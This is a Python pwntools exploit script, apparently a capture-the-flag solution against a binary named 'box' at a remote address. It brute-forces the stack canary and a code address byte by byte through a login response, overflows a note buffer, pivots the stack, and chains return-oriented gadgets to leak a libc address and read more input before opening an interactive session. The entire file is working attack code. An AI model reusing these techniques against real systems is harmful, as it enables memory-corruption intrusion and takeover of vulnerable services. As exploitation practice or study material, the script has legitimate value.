#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

host = '60.251.236.18'
y = remote( host , 10006 )
y = process( '../box/share/box' )

def login( usr , pwd ):
    y.sendafter( '>' , '2' )
    y.sendafter( ':' , usr )
    y.sendafter( ':' , pwd )

def logout():
    y.sendafter( '>' , '5' )

def new( data ):
    y.sendafter( '>' , '1' )
    y.sendlineafter( '> ' , data )

def update( idx , data ):
    y.sendafter( '>' , '2' )
    y.sendafter( '?' , str( idx ) )
    y.sendafter( '> ' , data )

def dle( idx ):
    y.sendafter( '>' , '4' )
    y.sendafter( '?' , str( idx ) )

y.sendafter( '>' , '1' )
y.sendafter( ':' , 'a' )
y.sendafter( ':' , 'b' )

pwd = 'b'.ljust( 0x88 , '\0' )

canary = '\0'

for i in range( 0x7 ):
    for c in range( 0x100 ):
        login( 'a' , pwd + canary + chr( c ) )
        if 'successfully.' in y.recvline():
            logout()
            canary += chr( c )
            info( 'canary -> %s' % hex( u64( canary.ljust( 8 , '\0' ) ) ) )
            break
        
success( 'canary -> %s' % hex( u64( canary ) ) )

leak = ''

for i in range( 0x6 ):
    for c in range( 0x100 ):
        login( 'a' , pwd + canary + leak + chr( c ) )
        if 'successfully.' in y.recvline():
            logout()
            leak += chr( c )
            info( 'leak -> %s' % hex( u64( leak.ljust( 8 , '\0' ) ) ) )
            break

pie = u64( leak + '\0\0' ) - 0x1970
success( 'pie -> %s' % hex( pie ) )

login( 'a' , 'b' )

for _ in range( 8 ):
    new( 'a' )

dle( 6 )
new( 'a' * 232 )

ret = pie + 0x1016
main = pie + 0x17d3
leave_ret = pie + 0x12ad
buf = pie + 0x4060
pop_rdi = pie + 0x19cb
pop_rbp = pie + 0x11df
pop_rsi_r15 = pie + 0x19c9
read_plt = pie + 0x10a0
atoi_plt = pie + 0x10e0
puts_plt = pie + 0x1050
setvbuf_plt = pie + 0x10d0
__libc_start_main_got = pie + 0x3fe0

p = flat(
    canary,
    buf + 0x50 - 8,
    leave_ret
)

update( 7 , 'a' * 0xe8 + p[:-1] )

p = flat(
    pop_rdi,
    __libc_start_main_got,
    atoi_plt,
    0,
    puts_plt,
    pop_rdi,
    0,
    pop_rsi_r15,
    buf + 0x500,
    0,
    read_plt,
)
update( 7 , 'a' * 0x50 + p )

y.interactive()